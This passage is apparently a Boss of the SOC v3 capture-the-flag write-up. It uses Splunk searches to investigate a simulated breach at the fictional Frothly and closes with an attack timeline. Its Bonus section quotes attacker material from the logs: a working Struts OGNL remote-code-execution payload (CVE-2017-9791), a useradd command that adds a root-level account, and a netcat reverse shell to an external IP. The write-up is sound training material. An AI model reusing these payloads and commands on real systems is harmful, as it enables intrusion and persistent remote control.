+<h3 id="321----the-taedonggang-adversary-sent-grace-hoppy-an-email-bragging-about-the-successful-exfiltration-of-customer-data-how-many-frothly-customer-emails-were-exposed-or-revealed">321 -|- The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> <span style="color:#e6db74">&#34;grace hoppy&#34;</span>
+</code></pre></div><p>45 events. Replace the search with the receiver field:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> <span style="color:#e6db74">&#34;receiver_email{}&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ghoppy@froth.ly&#34;</span>
+</code></pre></div><p>25 events. Looking at the list of senders, we seen the Naver address from Q319.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span>
+  <span style="color:#e6db74">&#34;receiver_email{}&#34;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ghoppy@froth.ly&#34;</span> sender_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hyunki1984@naver.com&#34;</span>
+</code></pre></div><p>1 event. The subject is &ldquo;All your datas belong to us&rdquo;. The content is base64 encoded, so decode it:</p>
+<pre tabindex="0"><code>Gracie,
+
+We brought your data and imported it: https://pastebin.com/sdBUkwsE 
+
+Also, you should not be too hard Bruce. He good man
+</code></pre><p>Going to the Pastebin, we can count our answer.</p>
+<blockquote>
+<p>8</p>
+</blockquote>
+<p>Time = 15:15:00</p>
+<p><br/><br/></p>
+<h3 id="322----what-is-the-path-of-the-url-being-accessed-by-the-command-and-control-server">322 -|- What is the path of the URL being accessed by the command and control server?</h3>
+<p>We know the compromised host, and we know from previous questions they used PowerShell. Often malicious PowerShell commands are base64 encoded, and hence the command will include &ldquo;FromBase64String&rdquo;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FYODOR-L&#34;</span> FromBase64String
+</code></pre></div><p>22 events. Looking through we quickly see <code>WinEventLog:Microsoft-Windows-PowerShell/Operational</code> has the most useful information. Looking through the <code>Message</code> (the PowerShell command), you find it&rsquo;s obfuscated, but includes 45.77.53.176 in base64 encoding and 3 unique URLs: <em>/admin/get.php</em> (2x), <em>/news.php</em> (2x), <em>/login/process.php</em></p>
+<blockquote>
+<p>/admin/get.php</p>
+</blockquote>
+<p>Times = 10:01:44, 10:07:07, 10:11:02, 10:15:28, 11:32:14</p>
+<p><br/><br/></p>
+<h3 id="323----at-least-two-frothly-endpoints-contact-the-adversarys-command-and-control-infrastructure-what-are-their-short-hostnames">323 -|- At least two Frothly endpoints contact the adversary&rsquo;s command and control infrastructure. What are their short hostnames?</h3>
+<p>We know the C2 URI.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;/admin/get.php&#34;</span>
+</code></pre></div><p>3 events, over 2 hosts.</p>
+<blockquote>
+<p>ABUNGST-L,FYODOR-L</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="324----who-is-al-bungsteins-cell-phone-providercarrier">324 -|- Who is Al Bungstein&rsquo;s cell phone provider/carrier?</h3>
+<p>Where does Al send his email from? First, what&rsquo;s his email address:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;Al Bungstein&#34;</span>
+</code></pre></div><p>Looks like it&rsquo;s <em><a href="mailto:abungstein@froth.ly">abungstein@froth.ly</a></em>. Do a general search instead of a field value search to capture all sources and sourcetypes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#e6db74">&#34;abungstein@froth.ly&#34;</span>
+</code></pre></div><p>93 events. A couple interesting fields include <code>src</code> and <code>FromIP</code>, from <code>s:o365:reporting:messagetrace</code>. They have the same values, with the top IP being 174.215.1.81. An online IP lookup gives us our answer.</p>
+<blockquote>
+<p>Verizon Wireless</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="325----microsoft-cloud-services-often-have-a-delay-or-lag-between-index-time-and-event-creation-time-for-the-entire-day-what-is-the-max-lag-in-minutes-for-the-sourcetype-msaadsignin">325 -|- Microsoft cloud services often have a delay or lag between &ldquo;index time&rdquo; and &ldquo;event creation time&rdquo;. For the entire day, what is the max lag, in minutes, for the sourcetype: ms:aad:signin?</h3>
+<p>First, create fields for the indextime and time, in a unified format. Next, convert them both to epoch time. From there, calculate the difference for each pair, find the max, and convert it to minutes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:aad:signin&#34;</span>
+| eval indextime<span style="color:#f92672">=</span>strftime<span style="color:#f92672">(</span>_indextime,<span style="color:#e6db74">&#34;%Y/%m/%d %H:%M:%S&#34;</span><span style="color:#f92672">)</span>
+| eval time<span style="color:#f92672">=</span>strftime<span style="color:#f92672">(</span>_time,<span style="color:#e6db74">&#34;%Y/%m/%d %H:%M:%S&#34;</span><span style="color:#f92672">)</span>
+| eval indextime_epoch<span style="color:#f92672">=</span>strptime<span style="color:#f92672">(</span>indextime,<span style="color:#e6db74">&#34;%Y/%m/%d %H:%M:%S&#34;</span><span style="color:#f92672">)</span>
+| eval time_epoch<span style="color:#f92672">=</span>strptime<span style="color:#f92672">(</span>time, <span style="color:#e6db74">&#34;%Y/%m/%d %H:%M:%S&#34;</span><span style="color:#f92672">)</span>
+| eval diff<span style="color:#f92672">=</span>indextime_epoch-time_epoch
+| stats max<span style="color:#f92672">(</span>diff<span style="color:#f92672">)</span> as max_lag
+| eval minutes<span style="color:#f92672">=</span>max_lag / <span style="color:#ae81ff">60</span>
+</code></pre></div><blockquote>
+<p>51</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="326----according-to-mallorys-advertising-research-how-is-beer-meant-to-be-enjoyed">326 -|- According to Mallory&rsquo;s advertising research, how is beer meant to be enjoyed?</h3>
+<p>First, who is Mallory?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mallory
+</code></pre></div><p>Gives us <em>Mallory Kraeusen (<a href="mailto:mkraeusen@froth.ly">mkraeusen@froth.ly</a>)</em>. Check her emails first, maybe she mentioned it there.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> sender_email<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mkraeusen@froth.ly&#34;</span>
+| table _time content_body<span style="color:#f92672">{}</span>
+</code></pre></div><p>11 events, but nothing useful. If we search all variations of her name, we get almost 10,000 events!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>Mallory OR Kraeusen OR mkraeusen@froth.ly OR MalloryKraeusen OR MKraeusen<span style="color:#f92672">)</span>
+</code></pre></div><p>Adding keywords might help:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>Mallory OR Kraeusen OR mkraeusen@froth.ly OR MalloryKraeusen OR MKraeusen<span style="color:#f92672">)</span>
+  AND <span style="color:#f92672">(</span>*advert* OR *research*<span style="color:#f92672">)</span>
+</code></pre></div><p>34 events. Scrolling through we find a file <em>BA_Advertising_Code_Overview.pdf</em> mentioned in a half of the events (17). None of the logs include the file, but it looks like she downloaded it with Chrome, suggesting it&rsquo;s available online. Google the name and it&rsquo;s available at <a href="https://s3-us-west-2.amazonaws.com/brewersassoc/wp-content/uploads/2017/04/BA_Advertising_Code_Overview.pdf" target="_blank">https://s3-us-west-2.amazonaws.com/brewersassoc/wp-content/uploads/2017/04/BA_Advertising_Code_Overview.pdf</a></p>
+<blockquote>
+<p>responsibly</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="328----what-text-is-displayed-on-line-2-of-the-file-used-to-escalate-tomcat8s-permissions-to-root">328 -|- What text is displayed on line 2 of the file used to escalate tomcat8&rsquo;s permissions to root?</h3>
+<p>Starting with just <em>tomcat8</em> gives us 380k events, but most are from unimportant sourcetypes, so remove them:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat8 AND NOT <span style="color:#f92672">(</span>source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;lsof&#34;</span> OR source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ps&#34;</span> OR source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;top&#34;</span> OR source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;package&#34;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>276 events. Most are <code>osquery:results</code>, with only 20 <code>Unix:XXX</code> sources. A quick check of the latter gives nothing helpful, so limit to the former:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;osquery:results&#34;</span> tomcat8
+</code></pre></div><p>256 events. Looking through the fields, there are two <code>columns.uid</code> (user ID) values - 244 events for uid=111 and 12 events for uid=0. 0 is root, and presumably 111 is tomcat8. Likewise for <code>decorations.username</code>, with 244 for tomcat8 and 12 for root.</p>
+<p>Use a table, in chronological order, of the users and commands.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;osquery:results&#34;</span> tomcat8 columns.cmdline<span style="color:#f92672">=</span>*
+| table _time decorations.username columns.cmdline
+| reverse
+</code></pre></div><p>At 11:34:49 tomcat8 runs <code>./colonelnew</code>, and the next event, at 11:48:38, root runs <code>rm /usr/share/tomcat8/.bash_history</code>. Checking the event, it seems that the location of the file is <em>/tmp/colonelnew</em>. Searching for the filename or location gives nothing; however, remembering Q315, there was also a file simply called colonel.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/tmp/colonel*
+</code></pre></div><p>35 events. Looking through Sysmon, as it often has useful information (and only 4 dedup&rsquo;d events), gives us:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/tmp/colonel* source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span>
+| dedup CommandLine
+| reverse
+</code></pre></div><p>So what happened?</p>
+<ol>
+<li>Use iexeplorer.exe to echo a string to /tmp/colonel</li>
+<li>Base64 decode the file to /tmp/colonel.c</li>
+<li>Cat and MD5sum the new file.</li>
+</ol>
+<p>Base64 decode the string and you get the answer</p>
+<blockquote>
+<ul>
+<li>Ubuntu 16.04.4 kernel priv esc</li>
+</ul>
+</blockquote>
+<p>TIme = 11:08:36 &amp; 11:10:55</p>
+<p>Host = hoth</p>
+<p><br/><br/></p>
+<h3 id="329----one-of-the-files-uploaded-by-taedonggang-contains-a-word-that-is-a-much-larger-in-font-size-than-any-other-in-the-file-what-is-that-word">329 -|- One of the files uploaded by Taedonggang contains a word that is a much larger in font size than any other in the file. What is that word?</h3>
+<p>From Q330, we know how to find files uploaded to OneDrive by Taedonggang:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ms:o365:management&#34;</span> Operation<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FileUploaded&#34;</span> UserAgent<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*Naenara*&#34;</span>
+</code></pre></div><p>This gives us the previously-found .lnk, as well as morebeer.jpg, stout.png, and stout-2.png. However, searching for these gives nothing.</p>
+<p>Upload may include email, and we know a threat actor&rsquo;s email:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:smtp&#34;</span> hyunki1984@naver.com attach_filename<span style="color:#f92672">{}=</span>*
+</code></pre></div><p>Here we find 1534778082419.png. Decoding that gives</p>
+<p><img src="../img/botsv3_img4.png" alt="botsv3_img4"></p>
+<p>No words there are much larger.</p>
+<p>It&rsquo;s possible the file will be base64 encoded, as email attachments in logs and malicious files often are. In fact, one of the answers from before was a base64 encoded file, and we haven&rsquo;t even looked at it yet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">definitelydontinvestigatethisfile.sh
+</code></pre></div><p>Decoded:</p>
+<p><img src="../img/botsv3_img5.png" alt="botsv3_img5"></p>
+<blockquote>
+<p>Splunk</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="330----what-frothly-vpn-user-generated-the-most-traffic">330 -|- What Frothly VPN user generated the most traffic?</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vpn
+</code></pre></div><p>854 events, 606 are from source <code>service</code> for <em>svchost.exe</em> for Extensible Authentication Protocol, Remote Access Connection Manager, or Secure Socket Tunneling Protocol Service. Related to VPNs, but no useful info. Let&rsquo;s try a few sources and sourcetypes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vpn sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:http&#34;</span>
+</code></pre></div><p>17 events, with <code>http_user_agent</code> for all of them being <code>Cisco AnyConnect VPN Agent for Windows 4.6.01098</code>. However, these events give us little other useful info.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vpn sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;symantec:ep:packet:file&#34;</span>
+</code></pre></div><p>124 events. 101 have a <code>Host_Name</code> of <em>MKRAEUS-L</em> (192.168.247.129 and 192.168.247.131), 23 of <em>PCERF-L</em> (172.16.197.137), connecting to 24.8.40.284. The <code>Application_Name</code> for all is <em>vpnagent.exe</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">vpn source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisconvmflowdata&#34;</span>
+| table _time sa da liuidp ppn pn dh
+</code></pre></div><p>40 events, featuring <em>BudStoll</em> (x25), <em>MalloryKraeusen</em> (x10), <em>PeatCerf</em> (x1) and <em>unknown</em> (x4). All connect to 24.8.40.284 &ldquo;<em>vpn.froth.ly</em>&rdquo;. Processes include <em>vpnui.exe</em>, <em>vpndownloader.exe</em>, and <em>vpnagent.exe</em>. Good info, but nothing on actual traffic generation.</p>
+<p>However, there is another Cisco sourcetype - with &gt;80k events:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisco:asa&#34;</span>
+</code></pre></div><p>This does have traffic data as <code>bytes</code>. There are 4 <code>action</code> values - blocked, teardown, allowed, and success. The only <code>action</code> with <code>bytes</code> is teardown - the others are presumably for making the connection → &gt;20k events</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisco:asa&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;teardown&#34;</span>
+</code></pre></div><p>Now the <code>src_ip</code>, of which there are 80.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisco:asa&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;teardown&#34;</span>
+| stats sum<span style="color:#f92672">(</span>bytes<span style="color:#f92672">)</span> as traffic by src_ip
+| sort -traffic
+</code></pre></div><p>The top IPs are 34.215.24.225, 107.77.212.175, then 192.168.8.117. Search each individually to see what they are. The first looks to be Splunk , the second looks to be AWS, and the third looks to be <em>MKRAEUS-L</em> a.k.a Mallory Kraeusen. Check with the VPN traffic, as each event also notes the user in brackets.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cisco:asa&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;teardown&#34;</span> src_ip<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;192.168.8.117&#34;</span>
+</code></pre></div><blockquote>
+<p>mkraeusen</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="331----using-splunk-commands-only-what-is-the-upper-fence-uf-value-of-the-interquartile-range-iqr-of-the-count-of-event-code-4688-by-windows-hosts-over-the-entire-day-use-a-15-multiplier">331 -|- Using Splunk commands only, what is the upper fence (UF) value of the interquartile range (IQR) of the count of event code 4688 by Windows hosts over the entire day? Use a 1.5 multiplier.</h3>
+<p>Start with the event code (7427 events), then do some maths.</p>
+<p>IQR is the 75th percentile minus the 25th percentile.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sourcetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wineventlog&#34;</span> EventCode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4688&#34;</span>
+| stats count by host
+| eventstats perc25<span style="color:#f92672">(</span>count<span style="color:#f92672">)</span> as p25, perc75<span style="color:#f92672">(</span>count<span style="color:#f92672">)</span> as p75
+| eval IQR<span style="color:#f92672">=</span>p75-p25
+| eval UF<span style="color:#f92672">=</span>p75+1.5*IQR
+</code></pre></div><blockquote>
+<p>1368</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="332----what-is-the-cve-of-the-vulnerability-that-escalated-permissions-on-linux-host-hoth">332 -|- What is the CVE of the vulnerability that escalated permissions on Linux host hoth?</h3>
+<p>From Q328, we know <em>colonel.c</em> was used for privesc by tomcat on hoth. Google the phrase &ldquo;CVE Ubuntu 16.04.4 kernel priv esc&rdquo; and we have the answer.</p>
+<blockquote>
+<p>CVE-2017-16995</p>
+</blockquote>
+<p><br/><br/></p>
+<h3 id="333----what-is-the-cve-of-the-vulnerability-that-was-exploited-to-run-commands-on-linux-host-hoth">333 -|- What is the CVE of the vulnerability that was exploited to run commands on Linux host hoth?</h3>
+<p>Again the Q328 search, the first command was <code>&quot;/bin/bash -c whoami&quot;</code> at 11:06:07, followed by several other commands. What happened just before this command, to allow the command to be run?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hoth&#34;</span> earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:11:05:08&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:11:06:08&#34;</span>
+</code></pre></div><p>A lot - 554 events. Let&rsquo;s add &ldquo;whoami&rdquo; in.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hoth&#34;</span> earliest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:11:05:08&#34;</span> latest<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;08/20/2018:11:06:08&#34;</span> whoami
+| reverse
+</code></pre></div><p>Now only 3 events! The latter two are the same as the original command; the first is a <code>stream:http</code> request to <em>/frothlyinventory/integration/saveGangster.action</em>. The <code>form_data</code> looks suspicious. Google &ldquo;saveGangster.action&rdquo; and we get our answer.</p>
+<blockquote>
+<p>CVE-2017-9791</p>
+</blockquote>
+<p><strong>Bonus</strong></p>
+<p>We saw <em>iexeplorer.exe</em> a few times in different questions, but what actually did it do?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">iexeplorer.exe source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span>
+  ParentImage<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe&#34;</span>
+| table _time CommandLine
+| reverse
+
+<span style="color:#75715e"># OR</span>
+
+iexeplorer.exe source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Security&#34;</span>
+  Creator_Process_Name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe&#34;</span>
+| table _time Process_Command_Line
+| reverse
+</code></pre></div><p>It seems the malicious file is used for remote code execution via <em>showcase.action</em> - also CVE-2017-9791. In other words, it&rsquo;s related to <em>saveGangster.action</em>. You can see the exact correlation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">(</span>saveGangster.action OR iexeplorer.exe<span style="color:#f92672">)</span>
+  <span style="color:#f92672">((</span>source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;WinEventLog:Microsoft-Windows-Sysmon/Operational&#34;</span>
+    AND ParentImage<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\\Windows\\Temp\\unziped\\lsof-master\\iexeplorer.exe&#34;</span><span style="color:#f92672">)</span>
+  OR source<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stream:http&#34;</span><span style="color:#f92672">)</span>
+| table _time CommandLine form_data
+| reverse
+</code></pre></div><p>11:05:40:</p>
+<p><code>&quot;C:\windows\temp\unziped\lsof-master\iexeplorer.exe&quot; http://192.168.9.30:8080/frothlyinventory/showcase.action whoami</code></p>
+<p>11:05:43:</p>
+<p><code>&quot;age=1&amp;__checkbox_bustedBefore=true&amp;name=${(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}&amp;description=1&quot;</code> (<em>saveGangster.action</em> <code>form_data</code>)</p>
+<br/>
+<p>The list of RCEs using this method:</p>
+<ol>
+<li>whoami</li>
+<li>id</li>
+<li>groups</li>
+<li>&ldquo;cat /etc/passwd&rdquo;</li>
+<li>&ldquo;useradd -ou 0 -g 0 -M -N -r -s /bin/bash tomcat7 -p davidverve.com&rdquo;</li>
+<li>&ldquo;uname -a&rdquo;</li>
+<li>&ldquo;lsb_release -a&rdquo;</li>
+<li>&ldquo;echo <!-- raw HTML omitted --> &raquo; /tmp/colonel&rdquo;</li>
+<li>&ldquo;echo <!-- raw HTML omitted --> &raquo; /tmp/definitelydontinvestigatethisfile.sh&rdquo;</li>
+<li>&ldquo;ls -lf /tmp&rdquo;</li>
+<li>&ldquo;base64 &ndash;decode /tmp/colonel &gt; /tmp/colonel.c&rdquo;</li>
+<li>&ldquo;cat /tmp/colonel.c&rdquo;</li>
+<li>&ldquo;md5sum /tmp/colonel.c&rdquo;</li>
+<li>&ldquo;mknod /tmp/backpipe p&rdquo;</li>
+<li>&ldquo;/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe&rdquo;</li>
+<li>&ldquo;mknod /tmp/backpipe p&rdquo;</li>
+<li>&ldquo;/bin/sh 0&lt;/tmp/backpipe | nc 45.77.53.176 8088 1&gt;/tmp/backpipe&rdquo;</li>
+</ol>
+<h2 id="timeline-1">Timeline</h2>
+<p><em>In Notion/the PDF theses are colour-coded by category - links at the top of this page.</em></p>
+<p>09:16:12: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to access IAM resources begin</p>
+<p>09:16:12: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to create nullweb_admin</p>
+<p>09:16:22: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to launch Xenial Xerus instance</p>
+<p>09:16:55: Email stating AKIAJOGCDXJ5NW5PXUPA/web_admin was detected on GitHub</p>
+<p>09:27:07: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to access IAM resources end</p>
+<p>09:27:06: AKIAJOGCDXJ5NW5PXUPA/web_admin attempts to describe an account</p>
+<p>09:55:14: Malicious attachment Frothly-Brewery-Financial-Planning-FY2019-Draft.xlsm</p>
+<p>09:55:52: Sysmon detects HxTsr.exe from malicious attachment</p>
+<p>09:56:39: Symantec detects HxTsr.exe from malicious attachment</p>
+<p>09:57:17: stout.png, stout-2.png, morebeer.jpg uploaded to OneDrive</p>
+<p>09:57:33: BRUCE BIRTHDAY HAPPY HOUR PICS.lnk uploaded to OneDrive</p>
+<p>09:59:04: First time BRUCE BIRTHDAY HAPPY HOUR PICS.lnk was used</p>
+<p>10:01:44: C2 server contacted</p>
+<p>10:07:07: C2 server contacted</p>
+<p>10:08:17: svcvnc Windows account created</p>
+<p>10:08:17: svcvnc added to Administrators group</p>
+<p>10:08:35: svcvnc added to Users group</p>
+<p>10:11:02: C2 server contacted</p>
+<p>10:15:28: C2 server contacted</p>
+<p>10:43:10: hdoor.exe scans network</p>
+<p>10:47:16: Attack tools logos.png downloaded from 45.77.53.176:3333</p>
+<p>10:48:28: Search for &ldquo;cromdale OR beer OR financial OR secret&rdquo;</p>
+<p>11:05:40: First remote code execution using iexeplorer.exe (CVE-2017-9791)</p>
+<p>11:08:36: colonel file streamed using iexeplorer.exe</p>
+<p>11:08:48: definitelydontinvestigatethisfile.sh file streamed using iexeplorer.exe</p>
+<p>11:21:40: BCC rule to <a href="mailto:hyunki1984@naver.com">hyunki1984@naver.com</a> added</p>
+<p>11:24:28: Kevin Lagerfield Azure AD account activated</p>
+<p>11:24:54: tomcat7 Linux account created</p>
+<p>11:28:30: Last time BRUCE BIRTHDAY HAPPY HOUR PICS.lnk was used</p>
+<p>11:31:54: netcat listening on port 1337 starts</p>
+<p>11:32:14: C2 server contacted</p>
+<p>11:34:01: Last remote code execution using iexeplorer.exe (CVE-2017-9791)</p>
+<p>11:34:49: tomcat8 runs <code>./colonelnew</code> (priv esc to root, CVE-2017-16995)</p>
